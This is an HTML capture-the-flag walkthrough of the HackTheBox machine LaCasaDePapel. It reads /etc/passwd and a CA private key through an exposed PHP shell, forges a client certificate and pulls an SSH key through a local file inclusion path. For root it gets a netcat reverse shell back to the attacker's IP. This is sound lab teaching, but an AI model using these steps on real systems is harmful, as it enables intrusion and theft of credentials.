@@ -1,0 +1,117 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">LaCasaDePapel HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/lacasadepapel-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-11T11:12:47+00:00">February 11, 2021</time><time class="updated" datetime="2025-06-23T08:32:02+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called LaCasaDePapel. It was created by <span style="color: #0000ff;"><strong>thek</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Enumerating Psy Shell</span></li>
+<li><span style="color: #000000;">Reading Sensitive Files using file_get_contents</span></li>
+<li><span style="color: #000000;">Crafting a Certificate to access HTTPS service</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Local File Inclusion</span></li>
+<li><span style="color: #000000;">Getting the id_rsa file through LFI</span></li>
+<li><span style="color: #000000;">Logging in through SSH</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Directories and Permissions</span></li>
+<li><span style="color: #000000;">Replace the script with shell invocation command</span></li>
+<li><span style="color: #000000;">Getting Root Shell</span></li>
+<li><span style="color: #000000;">Reading Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: <strong>10.129.79.144</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.79.144</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TM-pB-qhIm0/YCULZRcnvlI/AAAAAAAAtjk/jzUWxRNRon4pRul-lFkze0a8Jj5Wjm3pACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 21 (FTP), 22 (SSH) 80 (HTTP) and 443 (HTTP-SSL).</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Starting from FTP, we try to login in as an anonymous user. It was not allowed. It means that we need to enumerate the credentials in order to use FTP. Moving on to the HTTP service on the port, upon browsing the webpage hosted on port 80, we find a picture of the cast of the Netflix show “Money Heist,” which its Spanish adaptation calls “La casa de papel”. It has a QR code and email id field. We tried inspecting the source code and scanning the QR code using Google Authenticator but it was all worth nothing. It was time to move on to the next service.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QtVA_PmufoA/YCUMybVdV6I/AAAAAAAAtjs/-PGFqagGl1oSwB6EYyjfyXW6zq0hVfWHQCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">We performed directory Bruteforce and Nikto scans at this moment. They didn’t have any important information. We moved onto to the 443 HTTPS service. We get a certificate error in our browser. After allowing it, we see that we have a similar webpage as we did on port 80 but this time instead of a QR code we have an error message that says we need to provide a client certificate to access the website. Since we didn’t have any certificate we were out of luck.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Qd11-P1r-ys/YCUM4Qvyh5I/AAAAAAAAtjw/JgW82bEB_j8cndmCC7r9mDOCbg2rZSZHwCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">This is where we were desperate enough to try other tools and tricks. One of those was to perform an all-ports scan using nmap. In that scan, we found that there was a service running on the port 6200. We tried connecting to that service using netcat. We know from the banner that it is Psy Shell v0.9.9 based on PHP 7.2. It is basically a runtime developer console with features like interactive debugger and REPL for PHP. </span></p>
+<p><span style="color: #000000;">A quick read at the <a style="color: #000000;" href="https://github.com/bobthecow/psysh/wiki/Commands"><span style="color: #0000ff;"><strong>Psy Shell GitHub</strong></span></a>, we knew enough to get started with it. After knowing it is a runtime developer console the first thing, we decided to do was List local, instance or class variables, methods and constants. It can be done using ‘ls’ command. There was only one variable declared, $tokyo. We took a look into the variable Tokyo. A function called sign() uses a private key named ca.key located inside the user Nairobi home directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xoLdnODFLb0/YCUM91qeb-I/AAAAAAAAtj0/3a5lNw3roB4Yym6VK7SrmKTl9g7gQzVXACLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">This key can be used to generate a certificate that we require for accessing the HTTPS service. Let’s read the key using the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">file_get_contents('/home/nairobi/ca.key')</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6l3BEhvra0c/YCUNC1TC9UI/AAAAAAAAtj8/kgsAEpQ33s8xI7y8mg_Qb2OuVjuVVMYLQCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">As we can access the files using file_get_contents(). We grabbed the /etc/passwd as well.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">file_get_contents('/etc/passwd')</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PXv0_NLiEHQ/YCUNHeBdb1I/AAAAAAAAtkA/R_bwtQz-fN0VYB7tnXPGR7xYcxNgUQcWACLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">As seen from the private key screenshot above, the output contains “\n”. We remove it both from the private key and the /etc/passwd data. Then save the /etc/passwd data into a file named ca.key. Now we need a public key that can be obtained by connecting to the remote server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl s_client -connect 10.129.79.144:443 2&gt;/dev/null</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R_XjCrdXOQo/YCUNLkpcdiI/AAAAAAAAtkI/zHO_G9VH5LQT1wgTtDtdAH3_FhLlfptPACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We saved the public key as certificate.perm and then convert it into a PKCS12 certificate using the command below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl pkcs12 -inkey ca.key -in certificate.pem -export -out cert.p12</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EgU7UX57lEA/YCUNPha99aI/AAAAAAAAtkQ/sbe4bJ_Cvc4jbwlQ6kIfTma1COg2N85jwCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Now that we have the certificate, we head to the Certificate Manager in our Browser and Import the certificate we just created.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-3m9yoTWOZnw/YCUNURbK__I/AAAAAAAAtkU/o8Gb12ifkMAjxwlJEJEJk4HsE06EA5O7QCLcBGAsYHQ/s16000/10.png"/></strong></span></p>
+<p><span style="color: #000000;">It will ask for the passkey that was used while creating the certificate.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xANtgvQlxL8/YCUNYK3Sx8I/AAAAAAAAtkc/pYe3ee8x23YDALi0wUwPPndBgnh4lpVGQCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Now, we can see that the certificate is installed for the LaCasaDePapel. Now, let’s try to access the HTTPS service again.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-373u12cFGZQ/YCUNcYxbU1I/AAAAAAAAtkk/XYCPSvLX41YJgKlXi86BwlLArX6UZdoDACLcBGAsYHQ/s16000/12.1.png"/></span></p>
+<p><span style="color: #000000;">Last time we visited the HTTPS service, we added an exception for the lack of certificate, we need to remove that exception and choose the newly created certificate for authentication.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YR9qd07UV4I/YCUNhZj2XdI/AAAAAAAAtks/9dbMgTb0GIEhOsUS1N3kDo_sSIThOJWiQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">After gaining the access, we have an option to choose Season 1 or Season 2 of the Television series.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zcpimOnzv_I/YCUNnKkApnI/AAAAAAAAtkw/LZ7nPlj2W58RwlsmWXIf7Ygf6MsH_mjeACLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">It takes us to the page where we can download the episodes for that particular season.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ETuhGGFEqyM/YCUNuGF9wZI/AAAAAAAAtk4/KLc3N0mT0HUoJ0N0Unyf6Y79JQhqgLe0ACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Upon clicking the episode number, we discover that the server generates a GET request for browsing the episodes in that season. It uses a parameter called a path. In wild we have seen a lot of examples like this where there is an extreme lack of filtering which leads to Local File Inclusion or Directory Traversal Attacks. Hence, we tried to get the /etc/passwd file from this path parameter.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-unFXaVL09rw/YCUNzAQO6TI/AAAAAAAAtk8/R1sPssHY37sbV8iZ9KSh8Ozdr5evS9YgwCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">We tried listing directories by injecting the path parameter.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ay2DsVuZQjY/YCUN6zceFkI/AAAAAAAAtlE/gUf1y3b3LXkpVE0X-yxrTa702F8X6myBACLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Then, we found the .ssh directory. We traversed into it. But there is no way to interact with the files inside the directories as it is using scandir PHP function.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://10.129.79.144/?path=../.ssh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wA-mTles3DU/YCUOBD3AVGI/AAAAAAAAtlM/6FJvVqVu318MxeSD9slSJUz4HTLNBA9vwCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We enumerated other links and directories to find a way in. Doing this we noticed that each of the episode download links is not a direct link but some encrypted text.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--LqM8YJojYY/YCUOGglkijI/AAAAAAAAtlU/jb74SAH55WoWS2fq2EBlQCyAYLTiV75sACLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">First, guess as to what this encoded text might be was Base64. So, we tried to decode it. This gave us the direct location of the episode. Hence, all we need to do is to encode the id_rsa file path in base64 and then try to browse it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "../.ssh/id_rsa" | base64</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ud4Ar15jRE0/YCUOMOjunVI/AAAAAAAAtlY/AKZ1y4KXXqUEHHeXLMfhYlaF3eb4_D-EgCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Here, when we tried to access the file, we encountered an error, so we added lacasadepapel.htb to our etc/hosts file. We should have done this earlier.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CSLrZLEUEtk/YCUOQzT7wxI/AAAAAAAAtlg/MgiooeHODVEORIa9pi6_OEhiRIXq6PqNgCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">Now, after that, we take our crafter URL to download the id_rsa file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://lacasadepel.htb/file/Li4vLnNzaC9pZF9yc2E=</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-H14iE4uQ5W4/YCUOVmKtYtI/AAAAAAAAtlk/ZziTZ087x3QLr1MGKmHdz_rTXmxtVIDYQCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">We tried logging into the users that we got from /etc/passwd through SSH. We tried Berlin but were unsuccessful as it requires a password. Hence, we tried the professor and we were able to successfully login.</span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Now time to enumerate a way to elevate our privilege. We list the directory that we landed in. i.e., the home directory of the user professor. We found 2 files here. One file is memcached.ini and another file is memcached.js. We check the permission on both, it seemed that we cannot read memcached.js and cannot write them both. We read the memcached.ini and found that it is executing memcached.js as nobody using sudo. Since we know that we don’t have the write permissions on memecached.ini but we can delete it and replace it with our own command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4aFVEvkXN04/YCUOc95CA-I/AAAAAAAAtls/tRRLRFdIGigpI0eyfZEupR_s3ulVrAPLACLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">We created the memcached.ini on our machine, where we changed the command from executing the memcached.js to invoke a shell on our local attacker machine on port 4444. Then we sent the file to the same location as it was originally located. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/nc 10.10.14.85 4444 -e /bin/sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3ZeWW4zJ5mY/YCUOrtUD-5I/AAAAAAAAtl4/czT0_gFcJuA04vZd8WSj46PQ_ki6jVf2wCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">We downloaded the new memcached.ini using wget. You should download it in the home directory of the professor in order for it to work.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kjMc4pEpUgY/YCUOxcOoOhI/AAAAAAAAtmA/6pIdtz6uWqUlGn1etLK7IRELhMAHD4asQCLcBGAsYHQ/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">We started a netcat listener on the same port as we mentioned inside the memcached.ini file i.e., 4444. After a few moments, we got a session on our listener. We checked the privilege of the session and found that we have the root privilege. Reading the root flag concludes the machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444
+id
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3L3GYgcB8uY/YCUO3HkBgTI/AAAAAAAAtmE/OgR87Yp5GZ4hr6823bG_RBa0tW8_ejq_ACLcBGAsYHQ/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">NOTE: Instead of enumerating for the user flag, we focused on elevating the privilege of the session. Hence, we didn’t read the user flag earlier but now that we have the root access, we can just search for the user.txt and read the user flag.</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
